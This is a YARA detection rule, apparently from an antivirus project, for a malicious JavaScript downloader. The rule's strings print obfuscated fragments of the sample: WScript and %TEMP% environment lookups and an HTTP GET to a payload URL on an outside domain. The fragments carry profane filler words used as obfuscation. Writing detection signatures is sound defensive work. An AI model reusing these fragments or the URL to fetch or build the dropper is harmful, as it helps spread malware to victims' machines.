rule sig_20160428_a39399db7abc9853c9ac6a91bad78348 {
  meta:
    description = "datamaliciousorder - file 20160428_a39399db7abc9853c9ac6a91bad78348.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dfc5b7486cc7da1eca398b43d203905c7beff1acb5ee668fc7df4660ae3c728a"

  strings:
    $s1  = "function VjyXqhWvdDncQphWwzRxq(KjlZsmIkgQxmLzvKvfLdo){NhaAzxRdlRimPheHzfDgm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function VjyXqhWvdDncQphWwzRxq(KjlZsmIkgQxmLzvKvfLdo){NhaAzxRdlRimPheHzfDgm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UzgTmoBwqGrvJrrQgkVdm() {return NhaAzxRdlRimPheHzfDgm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var NhaAzxRdlRimPheHzfDgm = function MyzQbpMstEboHktTlvMjk() {return ZvnDavZgoDhkCirBffJlk[QylIhzLrkIayMcdQuhJzb](\"WScript\"+\"" ascii
    $s5  = "function QpmMinDfnPtkNvlHcfZab(KhtYxeLboFemPsaRvpBsp, EzkQdcHwgKvpIrvZgeVge){DskTmtZywJsoKkgXgnDiy = DskTmtZywJsoKkgXgnDiy * 1; " ascii
    $s6  = "return KhtYxeLboFemPsaRvpBsp - EzkQdcHwgKvpIrvZgeVge;};" fullword ascii
    $s7  = "var NhaAzxRdlRimPheHzfDgm = function MyzQbpMstEboHktTlvMjk() {return ZvnDavZgoDhkCirBffJlk[QylIhzLrkIayMcdQuhJzb](\"WScript\"+\"" ascii
    $s8  = "var ZvnDavZgoDhkCirBffJlk = this[\"WScript\"];" fullword ascii
    $s9  = "function UzgTmoBwqGrvJrrQgkVdm() {return NhaAzxRdlRimPheHzfDgm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function QpmMinDfnPtkNvlHcfZab(KhtYxeLboFemPsaRvpBsp, EzkQdcHwgKvpIrvZgeVge){DskTmtZywJsoKkgXgnDiy = DskTmtZywJsoKkgXgnDiy * 1; " ascii
    $s11 = "if (VutIahSmjEiuXmpFjeVwn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function FmpOkvXtsExmZirVepWgy(){return EaiUzaNrkDldMjfQtzRhc + \"\";};" fullword ascii
    $s13 = "function YbeVreNmqRrlZqxCbeKpo() {return ((QpoJsiElvSdwItsBtwOnn == true) && (QpoJsiElvSdwItsBtwOnn == NhvZsdGcrAsxTfaUvrFar)) ?" ascii
    $s14 = "VutIahSmjEiuXmpFjeVwn[WzfVadJreOxfZqjGoyBge](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s15 = "function YbeVreNmqRrlZqxCbeKpo() {return ((QpoJsiElvSdwItsBtwOnn == true) && (QpoJsiElvSdwItsBtwOnn == NhvZsdGcrAsxTfaUvrFar)) ?" ascii
    $s16 = "function GhzPveTbuRxnXvzVwiCjg(){return 23;};" fullword ascii
    $s17 = "function DteDgqWvkQnvTisRoqAgv(){return QylIhzLrkIayMcdQuhJzb;};" fullword ascii
    $s18 = "function LdfQfwPcuHezXdjLauIzo(BmpSitKlbGshQjoGdiEfl) {var EcgBkzNqkVmaTieBguJft = (1, 2, 3, 4, 5, BmpSitKlbGshQjoGdiEfl); retur" ascii
    $s19 = "QpoJsiElvSdwItsBtwOnn = true; " fullword ascii
    $s20 = "FhvGtbBlsJtuCqpXapYfd = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}